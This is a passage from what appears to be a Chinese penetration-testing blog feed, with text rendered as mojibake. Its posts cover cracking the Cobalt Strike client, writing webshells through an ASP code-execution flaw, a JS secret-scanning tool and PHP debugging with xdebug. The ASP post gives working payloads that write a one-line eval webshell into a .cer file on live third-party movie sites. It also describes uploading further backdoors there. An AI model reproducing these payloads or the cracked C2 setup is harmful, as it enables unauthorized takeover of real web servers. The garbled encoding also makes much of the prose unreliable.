title="ç»“è¯­"></a>ç»“è¯­</h2><p>è‡³æ­¤æˆ‘ä»¬æˆåŠŸç ´è§£cs 4.9.1å®¢æˆ·ç«¯å¹¶ä¸”é…åˆPwn3rzs æœåŠ¡ç«¯è¿›è¡Œä½¿ç”¨ã€‚å…¶ä»–åŠŸèƒ½æœªæµ‹è¯•å¦‚æœæœ‰æš—è£…åˆ†ææ–¹æ³•å¦‚ä¸Šå›¾ã€‚åé¢å°†è®²è§£åˆ†æcs exeå®¢æˆ·ç«¯ç”Ÿæˆæ–¹å¼å’Œshellcode å…³ç³»ã€‚åªæœ‰ç³»ç»Ÿäº†è§£ä»¥åæˆ‘ä»¬æ‰èƒ½æ›´å¥½çš„è¿›è¡Œå…æ€æ“ä½œã€‚æˆ‘ä»¬æ€»ç»“ä¸‰ç‚¹<br>ä¸€:å¯¹äºwebæ¸—é€æ¥è¯´æˆ‘ä»¬åªéœ€è¦å…³æ³¨ä¿¡æ¯æ”¶é›† xdayæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æˆ‘ä»¬è‡ªå·±å¼€å‘çš„exp pocå·¥å…·è¿›è¡Œé›†æˆæœ€æ–°çš„expã€‚é‚£å°±æ˜¯webframeworkToolsè§†é¢‘æ•™ç¨‹<br>è½¯ä»¶ä½¿ç”¨è§†é¢‘æ•™ç¨‹<br>webframeworktools5.0 ä½¿ç”¨æ•™ç¨‹<br> <a href="https://www.youtube.com/watch?v=TXG7W9WnbiI">https://www.youtube.com/watch?v=TXG7W9WnbiI</a> <br/><br>webframeworktools5.1 DLLç”Ÿæˆå™¨ä½¿ç”¨<br><a href="https://www.youtube.com/watch?v=IkhE4cNVNso">https://www.youtube.com/watch?v=IkhE4cNVNso</a> <br/><br>webframeworktools5.1 è‡ªå†™dllæ•™ç¨‹ã€‚ä½¿ç”¨å†…éƒ¨å°è£…å‡½æ•°ç¼–å†™ä¸Šä¼ åŠŸèƒ½ä»£ç ã€‚ä¸Šä¼ å†…å®¹ä½¿ç”¨å†…éƒ¨å°è£…å‡½æ•°å¯ä»¥è½¬æ¢ä»»æ„æ–‡ä»¶å†…å®¹ã€‚ç¼–å†™è¿›è¡Œä¸Šä¼ æ“ä½œã€‚å†…éƒ¨ä»£ç ä¸å…¬å¼€ä»…åšæ¼”ç¤ºæ“ä½œã€‚å…¶ä»–ç®€å•çš„ç¼–å†™å¯ä»¥å»åšå®¢çœ‹get postçš„æ•™ç¨‹ã€‚ç®€å•çš„å¯ä»¥ç›´æ¥ä¸€é”®ç”Ÿæˆexp<br><a href="https://www.youtube.com/watch?v=aLznRaoG_b4">https://www.youtube.com/watch?v=aLznRaoG_b4</a>  <br/><br>webframeworktools5.2 inié…ç½®æ•™ç¨‹<br><a href="https://www.youtube.com/watch?v=DlupWCAbBgg">https://www.youtube.com/watch?v=DlupWCAbBgg</a> <br/><br>è§†é¢‘æ•™ç¨‹å·²å‡ºã€‚ä¸ä¼šçš„è‡ªè¡Œå­¦ä¹ ã€‚æ—§ç‰ˆæœ¬è‡ªå†™dllå­˜åœ¨bugã€‚å¦‚æœæ²¡æœ‰è¾“å‡ºç»“æœå±äºæ­£å¸¸ã€‚åç»­ç‰ˆæœ¬å°†çº æ­£è¿™ä¸ªbug<br/></p><p>äºŒ:æˆ‘ä»¬äº†è§£äº†cså·¥ä½œåŸç†å¯¹äºå†…ç½‘æ¸—é€ä½¿ç”¨opsecæ“ä½œç­‰å¦‚è™æ·»ç¿¼ã€‚å†…ç½‘æ¸—é€æ¯”è¾ƒéš¾å¾—å°±æ˜¯åŸŸæ¸—é€ã€‚åç»­ç ”ç©¶ç ”ç©¶ä¹Ÿæ˜¯é‚£ä¸ªä¸è¿‡ä¹Ÿæ˜¯å›ºå®šæ‰“æ³•ã€‚å¤šå¤šç»ƒä¹ å°±ä¼šäº†ã€‚<br/></p><p>ä¸‰:ä¸»è¦æ˜¯ä»£ç çš„é—®é¢˜æˆ‘ä»¬åˆ†æäº†è¿™ä¹ˆå¤šä¸»è¦æ˜¯ä½ å¾—æœ‰java seå¼€å‘åŸºç¡€æ‰èƒ½å¬æ‡‚ã€‚å¦å¤–ä¸è¦å…‰çœ‹ä¸ç»ƒã€‚è¿™æ˜¯å­¦ä¸ä¼šçš„ã€‚<br/></p><p>å‚è€ƒé“¾æ¥:<a href="https://mp.weixin.qq.com/s/BXKPpEo7h3VqYCdOohPw2g">https://mp.weixin.qq.com/s/BXKPpEo7h3VqYCdOohPw2g</a>  ä¸ªäººè§‰å¾—æˆ‘ä»¬è®²è§£æ¯”è¾ƒè¯¦ç»†</p>]]></content>
      
      
      <categories>
          
          <category> PenetrationTest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CobaltStrike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>asp ä»£ç æ‰§è¡Œå¦‚ä½•å†™webshell</title>
      <link href="/penetrationtest/2024/12/articles/51ea5543eee06d62/"/>
      <url>/penetrationtest/2024/12/articles/51ea5543eee06d62/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>åœ¨ä¿®å¤å·¥å…·bugä¸­æˆ‘çœ‹åˆ°è½¯ä»¶æ‰«æçš„ç»“æœã€‚å­˜åœ¨åå‡ ä¸ªaspç”µå½±ç½‘ç«™çš„ä»£ç æ‰§è¡Œæ¼æ´ã€‚æˆ‘ä¼°è®¡å¯èƒ½å­˜åœ¨è¯¯æŠ¥ã€‚äºæ˜¯ä¹æµ‹è¯•äº†ä¸€ä¸‹å‘ç°ä¸å­˜åœ¨è¯¯æŠ¥ã€‚å¦å¤–å°è¯•ä½¿ç”¨èšå‰‘ç­‰å·¥å…·ç›´æ¥è¿æ¥å‘ç°æŠ¥é”™ã€‚æ‰€ä»¥æœ‰å¿…è¦å†™ä¸€ç¯‡æ–‡ä»¶æˆ‘ä»¬æœ‰ä¸€ä¸ªä»£ç æ‰§è¡Œçš„ç‚¹å¦‚ä½•å†™shellã€‚ä¸‹é¢å¼€å§‹æ­£æ–‡</p><h2 id="å®æˆ˜å†™webshell"><a href="#å®æˆ˜å†™webshell" class="headerlink" title="å®æˆ˜å†™webshell"></a>å®æˆ˜å†™webshell</h2><p>ä¸‹å›¾è½¯æ‰«æç»“æœå¯†ç ä¸ºaçš„å°±æ˜¯<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202412121656550.png" alt="è½¯ä»¶æ‰«æç»“æœ"><br>æˆ‘ä»¬æµ‹è¯•ä¸€ä¸‹çœ‹çœ‹æ˜¯å¦æ˜¯è¯¯æŠ¥<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202412121657409.png" alt="ä¸å­˜åœ¨è¯¯æŠ¥"><br>ä¸å­˜åœ¨è¯¯æŠ¥ä½†æ˜¯ä½¿ç”¨èšå‰‘è¿™äº›éƒ½è¿æ¥ä¸ä¸Šã€‚è¿™æ—¶å€™å°±éœ€è¦å†™shelläº†ã€‚å†™shelléœ€è¦çŸ¥é“ç»å¯¹è·¯å¾„æˆ‘ä»¬è·å–ä¸€ä¸‹ç»å¯¹è·¯å¾„</p><pre class="language-asp" data-language="asp"><code class="language-asp">response.write(Server.MapPath(&quot;&#x2F;&quot;))</code></pre><p> <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202412121658833.png" alt="è·å–webæ ¹è·¯å¾„"><br> è¿™æ—¶å€™æˆ‘ä»¬çœ‹æ ¹ç›®å½•æœ‰æ²¡æœ‰æƒé™å†™å…¥æ–‡ä»¶<br> <pre class="language-asp" data-language="asp"><code class="language-asp">a&#x3D;Server.CreateObject(&quot;Scripting.FileSystemObject&quot;).CreateTextFile(&quot;D:\\xxxx\\test.txt&quot;,True).Write(&quot;test&quot;)</code></pre><br> æ ¹ç›®å½•å†™å…¥æµ‹è¯•æ–‡ä»¶<br> <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202412121659163.png" alt="æ ¹ç›®å½•å†™å…¥æµ‹è¯•æ–‡ä»¶"><br> è®¿é—®çœ‹çœ‹è®¿é—®é‚£ç›´æ¥å†™shellã€‚è®¿é—®æˆåŠŸè¯´æ˜æ ¹ç›®å½•å¯å†™ã€‚å¦‚æœè®¿é—®404é‚£ä¹ˆæ ¹ç›®å½•ä¸å¯å†™åœ¨æ‰¾å…¶ä»–ç›®å½•<br> <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202412121700568.png" alt="æµ‹è¯•æ–‡ä»¶"><br>è¯•å‘ç°åªè¦æ˜¯aspçš„åç¼€åç§°éƒ½æ˜¯å†™å…¥å¤±è´¥çš„æˆ‘å°±ä¸å±•ç¤º äº†ã€‚é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å†™å…¥cerè¿™äº›åç¼€ã€‚å¹¶ä¸”å†™å…¥çš„æ—¶å€™å¦‚æœå‡ºç°åŒå¼•å·â€â€ ä¼šæŠ¥é”™æˆ‘ä»¬å¯ä»¥ç»•è¿‡<br>å†™é©¬</p><pre class="language-asp" data-language="asp"><code class="language-asp">Server.CreateObject(&quot;Scripting.FileSystemObject&quot;).CreateTextFile(&quot;D:\\xx\\test.cer&quot;,True).Write(&quot;&lt;%25eval(request(chr(97)))%25&gt;&quot;)  é©¬å­é‡Œé¢æ²¡æœ‰åŒå¼•å·ç›´æ¥ç»•è¿‡</code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202412121702286.png" alt="å†™shellæˆªå›¾"><br>ä½¿ç”¨cknife è¿æ¥ ã€‚ èšå‰‘è¿™ç§è¿æ¥ä¸ä¸Šã€‚å½“ç„¶è¿æ¥ä»¥åä½ è¦ä¸Šä¼ æ–‡ä»¶å¯èƒ½ä¼šå‡ºé—®é¢˜è¿™ç§ç®€å•çš„ä¸€å¥è¯ä¸æ˜¯é•¿ä¹…ä¹‹è®¡ã€‚æˆ‘ä»¬è¦å†™å†™é‚£ç§å°é©¬<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202412121704518.png" alt="å†™å…¥å°é©¬"><br>å°é©¬æˆ‘å°±ä¸è´´äº†ã€‚è‡ªå·±ä¿®æ”¹ä¸€ä¸‹å°±è¡Œäº†æ³¨æ„ åŒå¼•å·å’Œæ¢è¡Œè¿™äº›è¿™æ—¶å€™æˆ‘ä»¬è®¿é—®ä¸€ä¸‹çœ‹çœ‹ã€‚ä½¿ç”¨urlç¼–ç å°±è¡Œäº†<br>å°é©¬å†™å…¥æˆåŠŸ<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202412121705717.png" alt="å°é©¬å†™å…¥æˆåŠŸ"><br>æˆ‘ä»¬åˆ©ç”¨è¿™ä¸ªåœ¨å†™å…¥ä¸€ä¸ªå°é©¬ã€‚è¿™ä¸ªé©¬æ˜¯æ˜å°å­å·¥å…·é‡Œé¢çš„é©¬æˆ‘ä»¬æŠ å‡ºæ¥è¿™ä¸ªç¡®å®å¥½ç”¨ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202412121707712.png" alt="å†™å…¥é©¬å­"><br>æœ€åå†™ä¸€ä¸ªå¤§é©¬æ€€æ—§ä¸€ä¸‹ã€‚è¿™ä¸ªé©¬åº”è¯¥æ˜¯æœ‰ä¸ªåé—¨å¯ä»¥çˆ†å‡ºå¯†ç ã€‚è¿™äº›éƒ½æ— æ‰€è°“ä¸»è¦æ˜¯æ€€æ—§ä¸€ä¸‹å“ˆå“ˆå“ˆ<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202412121711867.png" alt="è‡´æˆ‘ä»¬é€å»çš„é’æ˜¥"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202412121714647.png" alt="è‡´æˆ‘ä»¬é€å»çš„é’æ˜¥"></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>ç°åœ¨ç½‘ç«™æ˜¯è¶Šæ¥è¶Šå®‰å…¨äº†ã€‚åŸºæœ¬é ä¹‹å‰çš„æ‰‹æ³•æå¾ˆéš¾æäº†ã€‚å¦å¤–ç°åœ¨wafæ¯”è¾ƒå¤šä½ è¦æ˜¯ä¸€ç‚¹ä»£ç éƒ½ä¸ä¼šé‚£ä¹ˆä½ å°†å¾ˆè¢«åŠ¨ã€‚ä¹‹å‰ä¸€ä¸ªå·¥å…·æˆ–è€…æ‰¹é‡å·¥å…·å¯ä»¥æ—¥ç«™çš„æ—¥å­æ²¡é‚£ä¹ˆå¤šäº†ã€‚ç°åœ¨éœ€è¦äººå·¥é…åˆå·¥å…·ã€‚å•çº¯é å·¥å…·getshellé‚£æ˜¯å¾ˆè´¹åŠ²çš„ã€‚æ‰€ä»¥å¯ä»¥é€‚å½“å­¦ä¹ ä¸€é—¨ç¼–ç¨‹è¯­è¨€ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> PenetrationTest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PenetrationTestingExample </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jsæ•æ„Ÿä¿¡æ¯æŸ¥æ‰¾å·¥å…·æ”¹é€ ç‰ˆæœ¬-peiqiF4ck</title>
      <link href="/penetrationtest/2024/12/articles/fc6ad7808b830bbd/"/>
      <url>/penetrationtest/2024/12/articles/fc6ad7808b830bbd/</url>
      
        <content type="html"><![CDATA[<h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><p>åœ¨æˆ‘ä»¬æ¸—é€æµ‹è¯•ä¸­é‡åˆ°å°ç¨‹åºæŠŠä»–çš„ä»£ç åç¼–è¯‘å‡ºæ¥æˆ–è€…æ˜¯åœ¨æ³„éœ²source map ä¸‹è½½æºä»£ç ä»¥åä¸€ä¸ªä¸€ä¸ªçš„æ‰¾é“­æ„Ÿä¿¡æ¯å¤ªéº»çƒ¦æˆ‘åœ¨githubä¸­æ‰¾åˆ°ä¸€ä¸ªé¡¹ç›®<a href="https://github.com/bingtangbanli/jsfinderPro">https://github.com/bingtangbanli/jsfinderPro</a> <br/> æ„Ÿè§‰è¿™ä¸ªé¡¹ç›®è¿˜å¯ä»¥ä½†æ˜¯æŸäº›åœ°æ–¹éœ€è¦ç¨å¾®æ”¹åŠ¨ä¸€ä¸‹æ‰èƒ½å˜å¾—ä¸è¿‡ã€‚è¿™ä¸ªåœ¨convention.txt é‡Œé¢å¯ä»¥æ·»åŠ æ­£åˆ™è¡¨è¾¾å¼ä¸°å¯Œä¸€ä¸‹å·¥å…·ã€‚</p><h2 id="æ”¹é€ æˆªå›¾"><a href="#æ”¹é€ æˆªå›¾" class="headerlink" title="æ”¹é€ æˆªå›¾"></a>æ”¹é€ æˆªå›¾</h2><p>æˆ‘ä»¬å¯ä»¥è‡ªå®šä¹‰åŠ æ­£åˆ™è¡¨è¾¾å¼æŠŠHaeå’Œburpapifingderé‡Œé¢æ­£åˆ™åŠ å…¥é‡Œé¢ã€‚æˆ‘åŠ äº†ä¸€éƒ¨åˆ†å‡ºæ¥<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202412051656549.png" alt="æ”¹é€ æˆªå›¾"><br>æˆå“å‘åˆ°é¢‘é“é‡Œé¢å¦‚æœéœ€è¦è½¬è½½å’Œä¿®æ”¹è¯·ä¿ç•™ç‰ˆæƒä¿¡æ¯!!!<br>ä¸‹è½½åœ°å€:<a href="https://t.me/SoftwareNoticeChannel/734">https://t.me/SoftwareNoticeChannel/734</a> <br/></p>]]></content>
      
      
      <categories>
          
          <category> PenetrationTest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SecurityTools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä»£ç å®¡è®¡ä¹‹vscode xdebugåŠ¨æ€è°ƒè¯•phpæ•™ç¨‹</title>
      <link href="/codeaudit/2024/11/articles/40395b9e6e72cc99/"/>
      <url>/codeaudit/2024/11/articles/40395b9e6e72cc99/</url>
      
        <content type="html"><![CDATA[<h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><p>æˆ‘ä»¬åœ¨è¿›è¡Œä»£ç å®¡è®¡çš„æ—¶å€™é‡åˆ°å¤æ‚çš„ä»£ç ä»é™æ€ä¸€ä¸‹å­çœ‹ä¸å‡ºæ¥å°±éœ€è¦åŠ¨æ€è°ƒè¯•ã€‚æˆ‘å‰é¢çš„æ–‡ç« ä¹Ÿè¯´äº†ã€‚é‡åˆ°ä¸€ä¸ªéªšæ‰°å¹¿å‘Šé‚£ä¸ªç«™ç‚¹å°±æ˜¯thinkphpå¼€å‘çš„ä¸è¿‡æˆ‘å–œæ¬¢é™æ€å’Œè¾“å‡ºè¯­å¥è¿›è¡Œå®¡è®¡ã€‚æ²¡æœ‰è¿›è¡ŒåŠ¨æ€è°ƒè¯•ã€‚å“ªä¸ªå®¡è®¡å‡ºä¸€ä¸ªdayé…åˆè¿›å…¥åå°ä»åŒipç½‘ç«™é—´æ¥æ‹¿ä¸‹ç›®æ ‡ç½‘ç«™ã€‚åç»­ç­‰æœ‰æ—¶é—´å‡ºä¸ªæ–‡ç« å†™å†™å§ã€‚ä»Šå¤©ä¸»è¦è®²çš„æ˜¯åŠ¨æ€è°ƒè¯•</p><h2 id="å‡†å¤‡è¿‡ç¨‹"><a href="#å‡†å¤‡è¿‡ç¨‹" class="headerlink" title="å‡†å¤‡è¿‡ç¨‹"></a>å‡†å¤‡è¿‡ç¨‹</h2><p>ç¬¬ä¸€æ­¥:ä¸‹è½½vscode,52ç ´è§£åˆ†äº«çš„ä¸‹è½½é“¾æ¥<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411291510074.png" alt="vscodeè½¯ä»¶"><br>ä¸‹è½½ä»¥åæ‰“å¼€vscode åœ¨å•†åº—é‡Œé¢æœç´¢xdebugã€‚æˆ‘å®‰å“çš„æ˜¯1.14ç‰ˆæœ¬<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411291512168.png" alt="xdebug"><br>å®‰è£…å¥½ä»¥åæˆ‘ä»¬éœ€è¦ä½¿ç”¨vscodeæ‰“å¼€è¦è°ƒè¯•ç½‘ç«™çš„ç›®å½•å¹¶ä¸”åœ¨æ ¹ç›®å½•åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å†…å®¹ä¸ºphpinfo();ç„¶åè®¿é—®è¿™ä¸ªæ–‡ä»¶è¾“å‡ºphpinfoå†…å®¹<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411291515932.png" alt="phpinfo"><br>æŠŠphpinfo è¾“å‡ºçš„æ‰€æœ‰å†…å®¹å¤åˆ¶åˆ°è¿™ä¸ªç½‘ç«™ä¸Šé¢  <a href="https://xdebug.org/wizard.php">https://xdebug.org/wizard.php</a>  è®°ä½æ˜¯phpinfoè¾“å‡ºçš„å…¨éƒ¨å†…å®¹æ‰€æœ‰å†…å®¹ã€‚<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411291516764.png" alt="åˆ†æphpinfoå†…å®¹"><br>åˆ†æç»“æœå¦‚ä¸‹:<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411291517126.png" alt="åˆ†æç»“æœ"><br>1:ä¸‹è½½  php_xdebug-3.1.6-7.3-vc15-nts-x86_64.dll<br/><br>2:æŠŠä¸‹è½½å¥½çš„dllæ–‡ä»¶å¤åˆ¶åˆ° E:\debugphp\Extensions\php\php7.3.4nts\ext<br/><br>3:ç„¶ååœ¨ E:\debugphp\Extensions\php\php7.3.4nts\php.ini åŠ å…¥ä¸€è¡Œ<br>zend_extension &#x3D; xdebug<br/><br>4ï¼šç„¶åé‡å¯webæœåŠ¡å™¨<br/><br>æˆ‘ä»¬æ¥æ“ä½œ<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411291518415.png" alt="æ­¥éª¤äºŒ"><br>é‡å‘½åçš„æ—¶å€™å‘ç°æœ‰php_xdegæˆ‘ä»¬å¯ä»¥æŠŠåŸæ¥çš„æä¸ªå¤‡ä»½çœ‹çœ‹<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411291520646.png" alt="æ­¥éª¤äºŒ"><br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411291521084.png" alt="æ­¥éª¤ä¸‰"><br>é‡å¯ä¸€ä¸‹ç½‘ç«™ã€‚æˆ‘çœ‹å†æ¬¡åœ¨phpinfoé¡µé¢æ£€æµ‹xdebugè¿™ä¸ª<br>æ˜¯å¦æ”¯æŒè°ƒè¯•å…³é”®phpinfoæ˜¾ç¤ºäº†xdebugé€‰é¡¹<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411291523313.png" alt="xdebugæ”¯æŒ"><br>æˆ‘ä»¬åœ¨å•†åº—æœç´¢ä¸€ä¸‹php debugã€‚æˆ‘ä»¬çš„xdebugç‰ˆæœ¬æ˜¯3.xçš„ã€‚æ‰€ä»¥å¤åˆ¶çº¢æ¡†é‡Œé¢çš„å»php.inié‡Œé¢<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411291524749.png" alt="xdebugè°ƒè¯•æ’ä»¶ç‰ˆæœ¬"><br>æ‰€ä»¥æˆ‘ä»¬åœ¨php.iniåŠ å…¥</p><pre class="language-ini" data-language="ini"><code class="language-ini"><span class="token key attr-name">xdebug.mode</span> <span class="token punctuation">=</span> <span class="token value attr-value">debug</span><span class="token key attr-name">xdebug.start_with_request</span> <span class="token punctuation">=</span> <span class="token value attr-value">yes</span><span class="token key attr-name">xdebug.client_port</span> <span class="token punctuation">=</span> <span class="token value attr-value">9000</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411291526628.png" alt="é…ç½®æ–‡ä»¶é‡Œé¢åŠ å…¥è°ƒè¯•"><br>æ³¨æ„ä¸åŒçš„xdebug ç‰ˆæœ¬ è¾“å…¥çš„ä¸œè¥¿ä¸ä¸€æ ·ã€‚æ¥åˆ°debug å›¾æ ‡ç„¶ååˆ›å»ºlaunch.jsonæ–‡ä»¶<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411291527345.png" alt="è°ƒè¯•é€‰é¡¹"><br>è°ƒè¯•è¯­è¨€æ˜¯phpã€‚æ³¨æ„è¿™é‡Œè¦ä¸php.inié‡Œé¢é…ç½®çš„ç«¯å£è¦ä¸€æ ·ã€‚æ³¨æ„æ›´æ”¹é…ç½®æ–‡ä»¶å¿…é¡»é‡å¯ç½‘ç«™!!!!<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411291528854.png" alt="è°ƒè¯•é…ç½®æ–‡ä»¶"><br>æˆ‘ä»¬æ¥åˆ°åå°ç™»é™†çš„ä»£ç å¤„æ‰“ä¸Šæ–­ç‚¹<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411291530395.png" alt="æµ‹è¯•æ–­ç‚¹"><br>ç„¶åç‚¹å‡»å¼€å§‹åœ¨è¿è¡Œ-å¯åŠ¨è°ƒè¯•å‡ºç°ä¸‹å›¾çŠ¶æ€è¯´æ˜å¼€å§‹è°ƒè¯•äº†<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411291531565.png" alt="è¿è¡Œè°ƒè¯•"><br>æˆ‘ä»¬ç”¨ç½‘é¡µè®¿é—®æäº¤è´¦å·å¯†ç <br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411291532719.png" alt="æ˜¾ç¤ºæ­£åœ¨æäº¤"><br>æˆ‘ä»¬å†çœ‹vscodeé‡Œé¢æ–­ä½æ²¡æœ‰<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411291534764.png" alt="æ–­ä½äº†"><br>ä½†æ˜¯æ²¡è°ƒè¯•ä¸€ä¼šå„¿å‡ºç°ä¸‹é¢é”™è¯¯ã€‚è¿™æ˜¯å› ä¸ºapache è¶…æ—¶äº†ã€‚<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411291534861.png" alt="è°ƒè¯•è¶…æ—¶"><br>æˆ‘ä»¬å¦‚ä½•æ¥è§£å†³è¿™ä¸ªé—®é¢˜å‘¢æˆ‘æŸ¥è¯¢äº†å¤§é‡èµ„æ–™å‘ç°ä»–ä»¬è®²çš„éƒ½ä¸å¤ªè¡Œã€‚<br><a href="https://maoshu.fun/articles/801.html">https://maoshu.fun/articles/801.html</a><br/><br><a href="https://h.opdwz.cn/feeds/SQAxf2OEme">https://h.opdwz.cn/feeds/SQAxf2OEme</a><br/><br>è¿™ä¸‹è¾¹çš„ç›¸å¯¹æ¯”è¾ƒé è°±ä½†æ˜¯å¯¹äºæˆ‘ä»¬è¿™é‡Œæ¥è¯´è¿˜æ˜¯ä¸å¤ªè¡Œã€‚<br><a href="https://httpd.apache.org/mod_fcgid/mod/mod_fcgid.html">https://httpd.apache.org/mod_fcgid/mod/mod_fcgid.html</a>   <br/><br><a href="https://blog.csdn.net/qq_37482307/article/details/92236264">https://blog.csdn.net/qq_37482307/article/details/92236264</a> <br/></p><h2 id="è§£å†³phpstudy-apacheè°ƒè¯•å‡ºç°è¶…æ—¶çš„é—®é¢˜"><a href="#è§£å†³phpstudy-apacheè°ƒè¯•å‡ºç°è¶…æ—¶çš„é—®é¢˜" class="headerlink" title="è§£å†³phpstudy apacheè°ƒè¯•å‡ºç°è¶…æ—¶çš„é—®é¢˜"></a>è§£å†³phpstudy apacheè°ƒè¯•å‡ºç°è¶…æ—¶çš„é—®é¢˜</h2><p>æˆ‘ä»¬æ¥åˆ°phpinoé¡µé¢<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411291539338.png" alt="phpinfoé¡µé¢"><br>åœ¨è¿™é‡Œ Loaded Configuration File æœç´¢  E:&#x2F;debugphp&#x2F;Extensions&#x2F;php&#x2F;php7.3.4nts&#x2F;<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411291540570.png" alt="æœç´¢æˆªå›¾"><br>æ‰“å¼€æˆ‘ä»¬æœç´¢åˆ°æ–‡ä»¶ç„¶åæ·»åŠ ä¸‹é¢çš„ä¸œä¸œ<br>å‘ç°çœŸæ­£çš„é…ç½®æ–‡ä»¶æ‰“å¼€ç„¶ååŠ å…¥ä¸‹é¢é…ç½®</p><pre class="language-ini" data-language="ini"><code class="language-ini">ProcessLifeTime 3600    FcgidIOTimeout 3600    FcgidConnectTimeout 3600    FcgidOutputBufferSize 128    FcgidMaxRequestsPerProcess 1000    FcgidMinProcessesPerClass 0    FcgidMaxRequestLen 268435456       FcgidInitialEnv PHP_FCGI_MAX_REQUESTS 1000    IPCConnectTimeout 3600    IPCCommTimeout 3600    FcgidIdleTimeout 3600    FcgidBusyTimeout 60000</code></pre><p>æ·»åŠ åçš„æˆªå›¾<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411291542692.png" alt="æ·»åŠ åçš„æˆªå›¾"><br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411291543582.png" alt="è¿™æ ·è°ƒè¯•å°±è¶…è¿‡8åˆ†é’Ÿäº†"><br>æ‚è°ˆ:<br/><br>å…‰åŠ ä¸Šè¿™ä¸¤ä¸ªé…ç½®åªèƒ½ç»´æŒ8-10åˆ†é’Ÿä»¥åç›´æ¥è¶…æ—¶:<br/><br>IPCConnectTimeout 3000 <br/><br>IPCCommTimeout 3000<br/><br>å¦å¤–å¯ä»¥åŠ ä¸Šè¿™ä¸ªé…ç½®åœ¨php.inié‡Œé¢(æ²¡å•¥å¤§ç”¨å¤„æ„Ÿè§‰)<br/><br>   max_execution_time&#x3D;0<br><br/><br>æ³¨æ„ä¿®æ”¹å®Œé…ç½®æ–‡ä»¶å¿…é¡»è¦é‡å¯ç½‘ç«™å¦åˆ™ä¸ç”Ÿæ•ˆã€‚</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æˆ‘ä»¬ä½¿ç”¨vscode åŠ¨æ€è°ƒè¯•php å°±è¯´åˆ°äº†è¿™é‡Œã€‚è¯´ä¸ªæ¯”è¾ƒåˆ‡åˆå®é™…çš„è¯è¿™éƒ½å…¬å…ƒ2024å¹´äº†å­¦ç‚¹ç¼–ç¨‹å§ã€‚å°¤å…¶æ˜¯phpè¿™ä¸ªå…¥é—¨ä»£ç å®¡è®¡çš„è¯­è¨€ã€‚å¦å¤–pythonè¿™ä¸ªæ˜¯å…¥é—¨å†™ç®€å•exp pocçš„ä¸œä¸œå»ºè®®å­¦ä¹ ä¸€ä¸‹ã€‚è¡Œäº†ä»Šå¤©å°±è¯´åˆ°è¿™é‡Œä¸‹è¯¾ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CodeAudit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CodeAuditExample </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zzzcms(asp) V1.5.6 ç‰ˆæœ¬ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ</title>
